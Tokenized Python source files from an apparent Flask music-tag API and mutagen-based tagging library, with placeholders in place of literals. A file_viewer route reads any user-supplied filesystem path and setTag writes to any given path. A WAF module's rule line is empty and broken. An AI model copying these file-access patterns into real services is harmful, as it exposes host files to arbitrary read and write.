, norm_key , _tag_name = '<STR_LIT>' ) <EOL> def set_discnum ( afile , norm_key , val ) : <EOL> return util . set_easy_discnum ( afile , norm_key , val , _tag_name = '<STR_LIT>' ) <EOL> def get_totaldiscs ( afile , norm_key ) : <EOL> return util . get_easy_totaldiscs ( afile , norm_key , _tag_name = '<STR_LIT>' ) <EOL> def set_totaldiscs ( afile , norm_key , val ) : <EOL> return util . set_easy_totaldiscs ( afile , norm_key , val , _tag_name = '<STR_LIT>' ) <EOL> def get_pictures ( afile , norm_key ) : <EOL> artworks = [ ] <EOL> for pic_tag , pic_type in pic_tag2type . items ( ) : <EOL> if pic_tag in afile . mfile . tags : <EOL> p = afile . mfile . tags [ pic_tag ] . value <EOL> try : <EOL> artwork = Artwork ( p , pic_type = pic_type ) <EOL> except OSError : <EOL> artwork = Artwork ( p . split ( b'<STR_LIT>' , <NUM_LIT> ) [ <NUM_LIT> ] , pic_type = pic_type ) <EOL> artworks . append ( artwork ) <EOL> return MetadataItem ( Artwork , None , artworks ) <EOL> def set_pictures ( afile , norm_key , artworks ) : <EOL> for art in artworks . values : <EOL> pic_tag = pic_type2tag [ art . pic_type ] <EOL> raw = ( pic_tag + '<STR_LIT>' ) . encode ( '<STR_LIT>' ) + b'<STR_LIT>' + art . raw <EOL> afile . mfile . tags [ pic_tag ] = raw <EOL> class Apev2File ( AudioFile ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . apev2 . APEv2File <EOL> _TAG_MAP = { <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_tracknum , <EOL> setter = set_tracknum , <EOL> remover = '<STR_LIT>' , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_totaltracks , <EOL> setter = set_totaltracks , <EOL> remover = '<STR_LIT>' , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_discnum , <EOL> setter = set_discnum , <EOL> remover = '<STR_LIT>' , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_totaldiscs , <EOL> setter = set_totaldiscs , <EOL> remover = '<STR_LIT>' , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = int , <EOL> sanitizer = util . sanitize_year ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = int , sanitizer = util . sanitize_bool ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_pictures , setter = set_pictures , <EOL> remover = list ( pic_tag2type . keys ( ) ) , <EOL> type = Artwork ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda afile , norm_key : None , <EOL> type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda afile , norm_key : None , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda afile , norm_key : None , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda afile , norm_key : None , <EOL> type = int ) , <EOL> } <EOL> def _ft_getter ( self , key ) : <EOL> val = self . mfile . tags . get ( key , None ) <EOL> if val is not None : <EOL> val = str ( val ) <EOL> return val <EOL> def _ft_setter ( self , key , md_val , appendable = True ) : <EOL> self . mfile . tags [ key ] = str ( md_val ) <EOL> class WavePackFile ( Apev2File ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . wavpack . WavPack <EOL> _TAG_MAP = Apev2File . _TAG_MAP . copy ( ) <EOL> _TAG_MAP . update ( { <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda afile , norm_key : '<STR_LIT>' , <EOL> type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda afile , norm_key : None , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda afile , norm_key : None , <EOL> type = int ) , <EOL> } ) <EOL> class MusepackFile ( Apev2File ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . musepack . Musepack <EOL> class MonkeysAudioFile ( Apev2File ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . monkeysaudio . MonkeysAudio <EOL> class OptimFrogFile ( Apev2File ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . optimfrog . OptimFROG <EOL> </s>
<s> from . import * <EOL> import os <EOL> from flask import request , abort , redirect , send_from_directory , render_template_string <EOL> from mod . auth import webui <EOL> from mod . auth . authentication import require_auth <EOL> @ app . route ( '<STR_LIT>' ) <EOL> def redirect_to_welcome ( ) : <EOL> return redirect ( '<STR_LIT>' ) <EOL> @ app . route ( '<STR_LIT>' ) <EOL> def favicon ( ) : <EOL> return send_from_directory ( src_path , '<STR_LIT>' ) <EOL> @ app . route ( '<STR_LIT>' ) <EOL> def return_index ( ) : <EOL> return send_from_directory ( src_path , '<STR_LIT>' ) <EOL> @ app . route ( '<STR_LIT>' ) <EOL> def serve_file ( filename ) : <EOL> FORBIDDEN_EXTENSIONS = ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , ) <EOL> _paths = filename . split ( '<STR_LIT>' ) <EOL> for _path in _paths : <EOL> if _path . startswith ( '<STR_LIT>' ) : <EOL> abort ( <NUM_LIT> ) <EOL> if filename . lower ( ) . endswith ( FORBIDDEN_EXTENSIONS ) : <EOL> abort ( <NUM_LIT> ) <EOL> try : <EOL> return send_from_directory ( src_path , filename ) <EOL> except FileNotFoundError : <EOL> abort ( <NUM_LIT> ) <EOL> @ app . route ( '<STR_LIT>' ) <EOL> @ v1_bp . route ( '<STR_LIT>' ) <EOL> def file_viewer ( filename ) : <EOL> match require_auth ( request = request ) : <EOL> case - <NUM_LIT> : <EOL> return render_template_string ( webui . error ( ) ) , <NUM_LIT> <EOL> case - <NUM_LIT> : <EOL> return render_template_string ( webui . error ( ) ) , <NUM_LIT> <EOL> ALLOWED_EXTENSIONS = ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , ) <EOL> if filename . lower ( ) . endswith ( ALLOWED_EXTENSIONS ) : <EOL> try : <EOL> return send_from_directory ( os . path . dirname ( filename ) , os . path . basename ( filename ) ) <EOL> except FileNotFoundError : <EOL> abort ( <NUM_LIT> ) <EOL> </s>
<s> import mutagen . aac <EOL> from . file import TAG_MAP_ENTRY <EOL> from . apev2 import Apev2File <EOL> class AacFile ( Apev2File ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . aac . AAC <EOL> _TAG_MAP = Apev2File . _TAG_MAP . copy ( ) <EOL> _TAG_MAP . update ( { <EOL> } ) <EOL> </s>
<s> import os <EOL> from . import * <EOL> from flask import request , render_template_string <EOL> from mod import tag <EOL> from mod . auth import webui <EOL> from mod . auth . authentication import require_auth <EOL> from mod . dev . debugger import debugger <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' , '<STR_LIT>' ] ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' , '<STR_LIT>' ] ) <EOL> @ v1_bp . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' , '<STR_LIT>' ] ) <EOL> def setTag ( ) : <EOL> match require_auth ( request = request , permission = '<STR_LIT>' ) : <EOL> case - <NUM_LIT> : <EOL> return render_template_string ( webui . error ( ) ) , <NUM_LIT> <EOL> case - <NUM_LIT> : <EOL> return render_template_string ( webui . error ( ) ) , <NUM_LIT> <EOL> music_data = request . json <EOL> audio_path = music_data . get ( "<STR_LIT>" ) <EOL> if not audio_path : <EOL> return "<STR_LIT>" , <NUM_LIT> <EOL> debugger . log ( "<STR_LIT>" , f"<STR_LIT>" ) <EOL> if not os . path . exists ( audio_path ) : <EOL> debugger . log ( "<STR_LIT>" , f"<STR_LIT>" ) <EOL> return "<STR_LIT>" , <NUM_LIT> <EOL> supported_tags = { <EOL> "<STR_LIT>" : { "<STR_LIT>" : ( str , bool , type ( None ) ) , "<STR_LIT>" : "<STR_LIT>" } , <EOL> "<STR_LIT>" : { "<STR_LIT>" : ( str , bool , type ( None ) ) , "<STR_LIT>" : "<STR_LIT>" } , <EOL> "<STR_LIT>" : { "<STR_LIT>" : ( str , bool , type ( None ) ) , "<STR_LIT>" : "<STR_LIT>" } , <EOL> "<STR_LIT>" : { "<STR_LIT>" : ( int , bool , type ( None ) ) , "<STR_LIT>" : "<STR_LIT>" } , <EOL> "<STR_LIT>" : { "<STR_LIT>" : ( str , bool , type ( None ) ) , "<STR_LIT>" : "<STR_LIT>" } <EOL> } <EOL> music_data [ "<STR_LIT>" ] = music_data . get ( "<STR_LIT>" ) or music_data . get ( "<STR_LIT>" ) <EOL> tags_to_set = { } <EOL> for key , value in music_data . items ( ) : <EOL> if key in supported_tags and isinstance ( value , supported_tags [ key ] [ "<STR_LIT>" ] ) : <EOL> tags_to_set [ key ] = value <EOL> try : <EOL> tag . write ( tags = tags_to_set , file = audio_path ) <EOL> except TypeError as e : <EOL> return { "<STR_LIT>" : <NUM_LIT> , "<STR_LIT>" : str ( e ) } , <NUM_LIT> <EOL> except FileNotFoundError as e : <EOL> return { "<STR_LIT>" : <NUM_LIT> , "<STR_LIT>" : str ( e ) } , <NUM_LIT> <EOL> except Exception as e : <EOL> return { "<STR_LIT>" : <NUM_LIT> , "<STR_LIT>" : str ( e ) } , <NUM_LIT> <EOL> return { "<STR_LIT>" : <NUM_LIT> , "<STR_LIT>" : f"<STR_LIT>" } , <NUM_LIT> <EOL> </s>
<s> import shutil <EOL> import logging <EOL> import sys <EOL> import os <EOL> from flask import Flask , Blueprint , request <EOL> from flask_caching import Cache <EOL> app = Flask ( __name__ ) <EOL> logger = logging . getLogger ( __name__ ) <EOL> v1_bp = Blueprint ( '<STR_LIT>' , __name__ , url_prefix = '<STR_LIT>' ) <EOL> v1_bp . config = app . config . copy ( ) <EOL> cache_dir = '<STR_LIT>' <EOL> try : <EOL> shutil . rmtree ( cache_dir ) <EOL> except FileNotFoundError : <EOL> pass <EOL> cache = Cache ( app , config = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : cache_dir <EOL> } ) <EOL> def make_cache_key ( * args , ** kwargs ) : <EOL> path = request . path <EOL> args = str ( hash ( frozenset ( request . args . items ( ) ) ) ) <EOL> return path + args <EOL> def get_base_path ( ) : <EOL> if getattr ( sys , '<STR_LIT>' , False ) : <EOL> return sys . _MEIPASS <EOL> else : <EOL> return os . getcwd ( ) <EOL> src_path = os . path . join ( get_base_path ( ) , '<STR_LIT>' ) <EOL> __all__ = [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] <EOL> </s>
<s> from __future__ import print_function <EOL> import argparse <EOL> from argparse import RawTextHelpFormatter <EOL> import csv <EOL> import fnmatch <EOL> import os <EOL> import sys <EOL> from . . import music_tag <EOL> _audio_pattern = [ '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , <EOL> '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ] <EOL> _default_tags = ( '<STR_LIT>' <EOL> '<STR_LIT>' <EOL> '<STR_LIT>' ) <EOL> def _expand_files ( files ) : <EOL> ret = [ ] <EOL> for f in files : <EOL> if os . path . isdir ( f ) : <EOL> for root , dirs , files in os . walk ( f ) : <EOL> for pattern in _audio_pattern : <EOL> for filename in fnmatch . filter ( files , pattern ) : <EOL> ret . append ( os . path . join ( root , filename ) ) <EOL> else : <EOL> ret . append ( f ) <EOL> return ret <EOL> def _main ( ) : <EOL> parser = argparse . ArgumentParser ( prog = '<STR_LIT>' , <EOL> description = __doc__ , <EOL> formatter_class = RawTextHelpFormatter ) <EOL> action_group = parser . add_mutually_exclusive_group ( required = True ) <EOL> action_group . add_argument ( '<STR_LIT>' , action = '<STR_LIT>' , <EOL> version = '<STR_LIT>' + music_tag . __version__ ) <EOL> action_group . add_argument ( '<STR_LIT>' , action = '<STR_LIT>' , <EOL> help = '<STR_LIT>' ) <EOL> action_group . add_argument ( '<STR_LIT>' , action = '<STR_LIT>' , default = [ ] , <EOL> help = '<STR_LIT>' ) <EOL> action_group . add_argument ( '<STR_LIT>' , action = '<STR_LIT>' , <EOL> help = '<STR_LIT>' ) <EOL> action_group . add_argument ( '<STR_LIT>' , action = '<STR_LIT>' , <EOL> help = '<STR_LIT>' ) <EOL> parser . add_argument ( '<STR_LIT>' , action = '<STR_LIT>' , default = _default_tags , <EOL> help = '<STR_LIT>' ) <EOL> parser . add_argument ( '<STR_LIT>' , '<STR_LIT>' , action = '<STR_LIT>' , <EOL> help = '<STR_LIT>' ) <EOL> parser . add_argument ( '<STR_LIT>' , '<STR_LIT>' , action = '<STR_LIT>' , default = '<STR_LIT>' , <EOL> help = '<STR_LIT>' ) <EOL> parser . add_argument ( '<STR_LIT>' , action = '<STR_LIT>' , <EOL> help = '<STR_LIT>' ) <EOL> parser . add_argument ( '<STR_LIT>' , nargs = '<STR_LIT>' ) <EOL> args = parser . parse_args ( ) <EOL> if args . print : <EOL> print ( ) <EOL> fnames = _expand_files ( args . files ) <EOL> tags = [ t . strip ( ) for t in args . tags . split ( '<STR_LIT>' ) ] <EOL> for fname in fnames : <EOL> f = music_tag . load_file ( fname ) <EOL> print ( f . info ( tags = tags , show_empty = True , resolve = args . resolve ) ) <EOL> print ( ) <EOL> if args . set : <EOL> set_key_vals = [ s . split ( '<STR_LIT>' ) for s in args . set ] <EOL> set_key_vals = [ ( kv [ <NUM_LIT> ] , '<STR_LIT>' . join ( kv [ <NUM_LIT> : ] ) ) for kv in set_key_vals ] <EOL> fnames = _expand_files ( args . files ) <EOL> for fname in fnames : <EOL> mt_f = music_tag . load_file ( fname ) <EOL> for kv in set_key_vals : <EOL> key , val = kv [ <NUM_LIT> ] , kv [ <NUM_LIT> ] <EOL> if val : <EOL> mt_f [ key ] = val <EOL> else : <EOL> del mt_f [ key ] <EOL> mt_f . save ( ) <EOL> if args . to_csv : <EOL> fnames = _expand_files ( args . files ) <EOL> tags = [ t . strip ( ) for t in args . tags . split ( '<STR_LIT>' ) ] <EOL> with open ( args . to_csv , '<STR_LIT>' , newline = '<STR_LIT>' ) as fout : <EOL> csvwriter = csv . writer ( fout , delimiter = '<STR_LIT>' , quotechar = '<STR_LIT>' , <EOL> dialect = args . csv_dialect , <EOL> quoting = csv . QUOTE_MINIMAL ) <EOL> csvwriter . writerow ( tags + [ '<STR_LIT>' ] ) <EOL> for fname in fnames : <EOL> mt_f = music_tag . load_file ( fname ) <EOL> if args . resolve : <EOL> row = [ mt_f . resolve ( k ) for k in tags ] + [ fname ] <EOL> else : <EOL> row = [ mt_f [ k ] for k in tags ] + [ fname ] <EOL> csvwriter . writerow ( row ) <EOL> if args . from_csv : <EOL> pth0 = '<STR_LIT>' <EOL> if args . files and os . path . isdir ( args . files [ <NUM_LIT> ] ) : <EOL> pth0 = args . files [ <NUM_LIT> ] <EOL> with open ( args . from_csv , newline = '<STR_LIT>' ) as fin : <EOL> csvreader = csv . reader ( fin , delimiter = '<STR_LIT>' , quotechar = '<STR_LIT>' , <EOL> dialect = args . csv_dialect ) <EOL> tags = [ ] <EOL> for row in csvreader : <EOL> if not tags : <EOL> tags = row [ : - <NUM_LIT> ] <EOL> else : <EOL> fname = row [ - <NUM_LIT> ] <EOL> if pth0 : <EOL> fname = os . path . join ( pth0 , fname ) <EOL> if os . path . isfile ( fname ) : <EOL> print ( '<STR_LIT>' , fname ) <EOL> else : <EOL> if args . ignore_missing : <EOL> print ( '<STR_LIT>' , fname , '<STR_LIT>' ) <EOL> continue <EOL> else : <EOL> print ( '<STR_LIT>' , fname , '<STR_LIT>' ) <EOL> return <NUM_LIT> <EOL> mt_f = music_tag . load_file ( fname ) <EOL> for key , val in zip ( tags , row [ : - <NUM_LIT> ] ) : <EOL> if val : <EOL> mt_f [ key ] = val <EOL> else : <EOL> del mt_f [ key ] <EOL> mt_f . save ( ) <EOL> return <NUM_LIT> <EOL> if __name__ == "<STR_LIT>" : <EOL> sys . exit ( _main ( ) ) <EOL> </s>
<s> import argparse <EOL> import json <EOL> import logging <EOL> import os <EOL> logger = logging . getLogger ( __name__ ) <EOL> parser = argparse . ArgumentParser ( description = "<STR_LIT>" ) <EOL> parser . add_argument ( '<STR_LIT>' , type = int , default = <NUM_LIT> , help = '<STR_LIT>' ) <EOL> parser . add_argument ( '<STR_LIT>' , type = str , default = '<STR_LIT>' , help = '<STR_LIT>' ) <EOL> parser . add_argument ( "<STR_LIT>" , action = "<STR_LIT>" , help = "<STR_LIT>" ) <EOL> kw_args , unknown_args = parser . parse_known_args ( ) <EOL> arg_auths : dict = { kw_args . auth : "<STR_LIT>" } if kw_args . auth else None <EOL> def first ( * args ) : <EOL> result = next ( filter ( lambda x : x , args ) , None ) <EOL> return result <EOL> class DefaultConfig : <EOL> def __init__ ( self ) : <EOL> self . ip = '<STR_LIT>' <EOL> self . port = <NUM_LIT> <EOL> class ConfigFile : <EOL> def __init__ ( self ) : <EOL> json_config = { <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : <NUM_LIT> <EOL> } , <EOL> "<STR_LIT>" : { } <EOL> } <EOL> file_path = os . path . join ( os . getcwd ( ) , "<STR_LIT>" , "<STR_LIT>" ) <EOL> try : <EOL> with open ( file_path , "<STR_LIT>" ) as json_file : <EOL> json_config = json . load ( json_file ) <EOL> except FileNotFoundError : <EOL> directory = os . path . dirname ( file_path ) <EOL> if not os . path . exists ( directory ) : <EOL> os . makedirs ( directory ) <EOL> with open ( file_path , "<STR_LIT>" ) as json_file : <EOL> json . dump ( json_config , json_file , indent = <NUM_LIT> ) <EOL> self . auth : dict = json_config . get ( "<STR_LIT>" , { } ) <EOL> self . server = json_config . get ( "<STR_LIT>" , { } ) <EOL> self . port = self . server . get ( "<STR_LIT>" , <NUM_LIT> ) <EOL> self . ip = self . server . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> class EnvVar : <EOL> def __init__ ( self ) : <EOL> self . auth = os . environ . get ( '<STR_LIT>' , None ) <EOL> self . port = os . environ . get ( '<STR_LIT>' , None ) <EOL> self . auths = None <EOL> if self . auth : <EOL> self . auths : dict = { <EOL> self . auth : "<STR_LIT>" <EOL> } <EOL> env_args = EnvVar ( ) <EOL> config_args = ConfigFile ( ) <EOL> default = DefaultConfig ( ) <EOL> class GlobalArgs : <EOL> def __init__ ( self ) : <EOL> self . auth : dict = first ( env_args . auths , arg_auths , config_args . auth ) <EOL> if type ( self . auth ) is not dict : <EOL> self . auth : dict = { } <EOL> self . port = first ( env_args . port , kw_args . port , config_args . port , default . port ) <EOL> self . ip = first ( config_args . ip , default . ip ) <EOL> self . debug = kw_args . debug <EOL> self . version = "<STR_LIT>" <EOL> def valid ( self , key ) : <EOL> return key in self . auth . keys ( ) <EOL> def permission ( self , key ) : <EOL> return self . auth . get ( key , '<STR_LIT>' ) <EOL> </s>
<s> from api import * <EOL> import re <EOL> from flask import request , abort <EOL> @ app . before_request <EOL> def check ( ) : <EOL> path = request . path <EOL> if waf ( path ) : <EOL> logger . warning ( f"<STR_LIT>" ) <EOL> abort ( <NUM_LIT> ) <EOL> def waf ( req : str ) : <EOL> NN_RULES = <EOL> for re_str in NN_RULES . split ( "<STR_LIT>" ) : <EOL> if re . search ( re_str , req ) : <EOL> logger . warning ( f"<STR_LIT>" ) <EOL> return True <EOL> return False <EOL> def test ( ) : <EOL> DATAS = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ] <EOL> for data in DATAS : <EOL> if not waf ( data ) : <EOL> print ( f"<STR_LIT>" ) <EOL> if __name__ == "<STR_LIT>" : <EOL> test ( ) <EOL> </s>
<s> import base64 <EOL> import os <EOL> import io <EOL> from PIL import Image <EOL> from mod import music_tag <EOL> TAG_MAP = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> def dump_b64 ( album_art : music_tag . file . MetadataItem ) -> str : <EOL> artwork = album_art . values [ <NUM_LIT> ] <EOL> img_data = artwork . data <EOL> img_format = artwork . format <EOL> img = Image . open ( io . BytesIO ( img_data ) ) <EOL> img_byte_arr = io . BytesIO ( ) <EOL> img . save ( img_byte_arr , format = img_format ) <EOL> img_base64 = base64 . b64encode ( img_byte_arr . getvalue ( ) ) <EOL> return img_base64 . decode ( ) <EOL> def write ( tags : dict , file : any ) -> None : <EOL> if not isinstance ( tags , dict ) : <EOL> raise TypeError ( f'<STR_LIT>' ) <EOL> file_path = file if isinstance ( file , str ) else ( file . name if hasattr ( file , '<STR_LIT>' ) else None ) <EOL> if not file_path or not os . path . exists ( file_path ) : <EOL> raise FileNotFoundError ( f'<STR_LIT>' ) <EOL> music_file_obj = music_tag . load_file ( file ) <EOL> for tag_name , tag_value in tags . items ( ) : <EOL> if tag_name == "<STR_LIT>" and tag_value : <EOL> artwork_raw : bytes = base64 . b64decode ( tag_value ) <EOL> artwork = music_tag . file . Artwork ( artwork_raw ) <EOL> music_file_obj [ tag_name ] = artwork <EOL> elif tag_name in TAG_MAP and tag_value : <EOL> music_file_obj [ tag_name ] = tag_value <EOL> elif tag_value is False : <EOL> del music_file_obj [ tag_name ] <EOL> else : <EOL> continue <EOL> music_file_obj . save ( ) <EOL> def read ( file : any ) -> dict : <EOL> file_path = file if isinstance ( file , str ) else ( file . name if hasattr ( file , '<STR_LIT>' ) else None ) <EOL> if not file_path or not os . path . exists ( file_path ) : <EOL> return { } <EOL> result = { } <EOL> for tag_name , tag_func in TAG_MAP . items ( ) : <EOL> if tag_name == "<STR_LIT>" : <EOL> result [ tag_name ] = dump_b64 ( music_tag . load_file ( file_path ) . resolve ( tag_name ) ) <EOL> else : <EOL> result [ tag_name ] = str ( music_tag . load_file ( file_path ) . resolve ( tag_name ) ) <EOL> return result <EOL> if __name__ == '<STR_LIT>' : <EOL> val_tags = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> print ( read ( r'<STR_LIT>' ) ) <EOL> </s>
<s> import mutagen . mp4 <EOL> import mutagen . easymp4 <EOL> from mutagen . mp4 import MP4FreeForm <EOL> from . import util <EOL> from . file import Artwork , AudioFile , MetadataItem , TAG_MAP_ENTRY <EOL> mutagen . easymp4 . EasyMP4Tags . RegisterTextKey ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> _MP4_ISRC_KEY = '<STR_LIT>' <EOL> def get_tracknum ( afile , norm_key ) : <EOL> trkn = afile . mfile . get ( '<STR_LIT>' , [ ( None , None ) ] ) [ <NUM_LIT> ] <EOL> try : <EOL> return trkn [ <NUM_LIT> ] <EOL> except IndexError : <EOL> return None <EOL> def set_tracknum ( afile , norm_key , val ) : <EOL> trkn = list ( afile . mfile . tags . get ( '<STR_LIT>' , [ ( <NUM_LIT> , <NUM_LIT> ) ] ) [ <NUM_LIT> ] ) <EOL> trkn += [ <NUM_LIT> ] * ( <NUM_LIT> - len ( trkn ) ) <EOL> trkn [ <NUM_LIT> ] = int ( val ) <EOL> trkn = tuple ( [ <NUM_LIT> if i is None else int ( i ) for i in trkn ] ) <EOL> afile . mfile . tags [ '<STR_LIT>' ] = [ trkn ] <EOL> def get_totaltracks ( afile , norm_key ) : <EOL> trkn = afile . mfile . get ( '<STR_LIT>' , [ ( None , None ) ] ) [ <NUM_LIT> ] <EOL> try : <EOL> return trkn [ <NUM_LIT> ] <EOL> except IndexError : <EOL> return None <EOL> def set_totaltracks ( afile , norm_key , val ) : <EOL> trkn = list ( afile . mfile . tags . get ( '<STR_LIT>' , [ ( <NUM_LIT> , <NUM_LIT> ) ] ) [ <NUM_LIT> ] ) <EOL> trkn += [ <NUM_LIT> ] * ( <NUM_LIT> - len ( trkn ) ) <EOL> trkn [ <NUM_LIT> ] = int ( val ) <EOL> trkn = tuple ( [ <NUM_LIT> if i is None else int ( i ) for i in trkn ] ) <EOL> afile . mfile . tags [ '<STR_LIT>' ] = [ trkn ] <EOL> def get_discnum ( afile , norm_key ) : <EOL> trkn = afile . mfile . get ( '<STR_LIT>' , [ ( None , None ) ] ) [ <NUM_LIT> ] <EOL> try : <EOL> return trkn [ <NUM_LIT> ] <EOL> except IndexError : <EOL> return None <EOL> def set_discnum ( afile , norm_key , val ) : <EOL> disc = list ( afile . mfile . tags . get ( '<STR_LIT>' , [ ( <NUM_LIT> , <NUM_LIT> ) ] ) [ <NUM_LIT> ] ) <EOL> disc += [ <NUM_LIT> ] * ( <NUM_LIT> - len ( disc ) ) <EOL> disc [ <NUM_LIT> ] = int ( val ) <EOL> disc = [ <NUM_LIT> if i is None else i for i in disc ] <EOL> afile . mfile . tags [ '<STR_LIT>' ] = [ tuple ( disc ) ] <EOL> def get_totaldiscs ( afile , norm_key ) : <EOL> trkn = afile . mfile . get ( '<STR_LIT>' , [ ( None , None ) ] ) [ <NUM_LIT> ] <EOL> try : <EOL> return trkn [ <NUM_LIT> ] <EOL> except IndexError : <EOL> return None <EOL> def set_totaldiscs ( afile , norm_key , val ) : <EOL> disc = list ( afile . mfile . tags . get ( '<STR_LIT>' , [ ( <NUM_LIT> , <NUM_LIT> ) ] ) [ <NUM_LIT> ] ) <EOL> disc += [ <NUM_LIT> ] * ( <NUM_LIT> - len ( disc ) ) <EOL> disc [ <NUM_LIT> ] = int ( val ) <EOL> disc = [ <NUM_LIT> if i is None else i for i in disc ] <EOL> afile . mfile . tags [ '<STR_LIT>' ] = [ tuple ( disc ) ] <EOL> def get_artwork ( afile , norm_key ) : <EOL> fmt_lut = { mutagen . mp4 . MP4Cover . FORMAT_JPEG : '<STR_LIT>' , <EOL> mutagen . mp4 . MP4Cover . FORMAT_PNG : '<STR_LIT>' , <EOL> } <EOL> artworks = [ Artwork ( bytes ( p ) ) for p in afile . mfile . tags [ '<STR_LIT>' ] ] <EOL> return MetadataItem ( Artwork , None , artworks ) <EOL> def set_artwork ( afile , norm_key , artworks ) : <EOL> if not isinstance ( artworks , MetadataItem ) : <EOL> raise TypeError ( ) <EOL> pics = [ ] <EOL> for art in artworks . values : <EOL> if any ( v is None for v in ( art . mime , ) ) : <EOL> raise ImportError ( "<STR_LIT>" ) <EOL> mime_fmt = art . mime . split ( '<STR_LIT>' ) [ <NUM_LIT> ] . upper ( ) <EOL> if mime_fmt == '<STR_LIT>' : <EOL> img_fmt = mutagen 